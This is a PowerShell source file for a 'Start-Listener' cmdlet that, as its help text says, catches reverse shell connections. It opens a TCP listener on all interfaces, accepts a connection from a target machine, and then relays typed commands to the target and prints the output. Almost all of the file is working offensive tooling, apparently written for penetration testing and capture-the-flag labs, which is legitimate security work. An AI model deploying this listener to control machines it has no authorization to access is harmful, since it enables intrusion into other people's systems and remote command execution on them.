<#
.SYNOPSIS
This cmdlet is for starting a listener that a reverse shell connection can attach too.


.DESCRIPTION
This cmdlet opens a listner port to connect to from a target machine.


.PARAMETER Port
This parameter is for defining the listening port to connect too. The cmdlet binds connections to the port that you specify. The default value for this parameter is 1337.


.EXAMPLE
Start-Listener
# This examples connects to a listener on port 1337.

.EXAMPLE
Start-Listener -Port 1234
# This examples connects to a listener on port 1234.


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.INPUTS
None


.OUTPUTS
None


.LINK
https://osbornepro.com
https://writeups.osbornepro.com
https://btpssecpack.osbornepro.com
https://github.com/tobor88
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286

#>
Function Start-Listener {
    [CmdletBinding(SupportsShouldProcess, ConfirmImpact = 'Low')]
        param(
            [Parameter(
                Mandatory=$False,
                Position=0,
                ValueFromPipeline=$False,
                HelpMessage='Enter a port to listen on. Valid ports are between 1 and 65535. Example: 1234')] # End Parameter
            [ValidateRange(1,65535)]
            [Int32]$Port = 1337
        ) # End param


    $PortString = $Port.ToString()

    Write-Verbose "Checking for availability of $PortString"

    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
    $Connections = $TCPProperties.GetActiveTcpListeners()
    If ($Connections.Port -Contains "$Port")
    {

        Throw "[!] Port $Port is alreday in use by another process(es). Select another port to use or stop the occupying processes."

    }  # End If

    Write-Verbose "Defining listener object"
    $Socket = New-Object -TypeName System.Net.Sockets.TcpListener('0.0.0.0', $Port)

    If ($Null -eq $Socket)
    {

        Exit

    } # End If

    Write-Verbose "Starting listener on port $PortString and creating job to allow closing the connection"

    If ($PSCmdlet.ShouldProcess($Socket.Start()))
    {

        Try
        {

            Write-Output ("[*] Listening on [0.0.0.0] (port $PortString)")
            While ($True)
            {

                Write-Verbose "Waiting for connection..."
                If ($Socket.Pending())
                {

                    $Client = $Socket.AcceptTcpClient()

                    Break;

                }  # End If

                Start-Sleep -Seconds 2

            }  # End While

        }  # End Try
        Finally
        {

            If (!($Client.Connected))
            {

                Write-Verbose "Terminating connection"
                $Socket.Stop()
                $Client.Close()
                $Stream.Dispose()
                Write-Verbose "Connection closed"

            }  # End If

        }  # End Finally

        Write-Output "[*] Connection Established"

        Write-Verbose "Creating byte stream"
        $Stream = $Client.GetStream()
        $Writer = New-Object -TypeName System.IO.StreamWriter($Stream)
        $Buffer = New-Object -TypeName System.Byte[] 2048
        $Encoding = New-Object -TypeName System.Text.AsciiEncoding

        Write-Verbose "Begin command execution loop"
        Do
        {

            $Command = Read-Host

            $Writer.WriteLine($Command)
            $Writer.Flush();

            If ($Command -eq "exit")
            {

                Write-Verbose "Exiting"
                Break

            }  # End If

            $Read = $Null

            While ($Stream.DataAvailable -or $Null -eq $Read)
            {

                $Read = $Stream.Read($Buffer, 0, 2048)
                $Out = $Encoding.GetString($Buffer, 0, $Read)

                Write-Output $Out

            } # End While

        } While ($Client.Connected -eq $True) # End Do While Loop

        Write-Verbose "Terminating connection"
        $Socket.Stop()
        $Client.Close()
        $Stream.Dispose()
        Write-Verbose "Connection closed"

    }  # End If
    Else
    {

        Write-Output "[*] Start-Listener would have started a listener on port $PortString"

    }  # End Else

} # End Function Start-Listener
